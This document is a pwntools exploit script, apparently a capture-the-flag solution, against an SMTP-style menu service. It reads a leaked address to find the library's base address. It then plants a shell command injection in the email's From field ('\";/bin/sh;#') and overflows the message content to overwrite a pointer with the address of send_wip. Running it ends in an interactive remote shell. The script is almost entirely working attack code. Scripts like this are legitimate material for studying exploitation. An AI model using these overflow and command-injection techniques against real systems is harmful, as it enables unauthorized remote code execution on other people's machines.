from sys import argv
from pwn import *

if len(argv) < 3:
    print("Usage: solve.py <host> <port> DEBUG")
    exit(1)

_, HOST, PORT = argv

exe = ELF('../src/lib/smtp.so')

r = remote(HOST, PORT)

def create(_from, to, subject, content):
    global r
    r.sendlineafter(b">>> ", b"1")
    r.sendlineafter(b"From: ", _from)
    r.sendlineafter(b"To: ", to)
    r.sendlineafter(b"Subject: ", subject)
    r.sendlineafter(b"Content: ", b64e(content))
    print(r.recvline())

def show():
    global r
    r.sendlineafter(b">>> ", b"2")
    print(r.recvuntil(b"Menu:"))

def send(idx):
    global r
    r.sendlineafter(b">>> ", b"4")
    r.sendlineafter(b"Index: ", str(idx).encode())
    print(r.recvline())

def edit(idx, content):
    r.sendlineafter(b">>> ", b"3")
    r.sendlineafter(b"Index: ", str(idx).encode())
    r.sendlineafter(b"New content: ", b64e(content))

r.recvline()
leak = r.recvline().strip().split()[-1]
r.recvline()
leak = int(leak, 16)

smtp_base = leak - exe.sym["EMAILS"]
print(hex(smtp_base))
exe.address = smtp_base

create(b"woody@mxlwa.re", b"woody@mxlwa.re", b"Quoicoubeh", b"Quoiboubeh")
create(b"osef\";/bin/sh;#\"woody@mxlwa.re", b"woody@mxlwa.re", b"victim", b"A" * 8000)

edit(1, b"A" * 4096+b"A" * 3 + p64(exe.sym["send_wip"]))
pause()
send(1)

r.interactive()
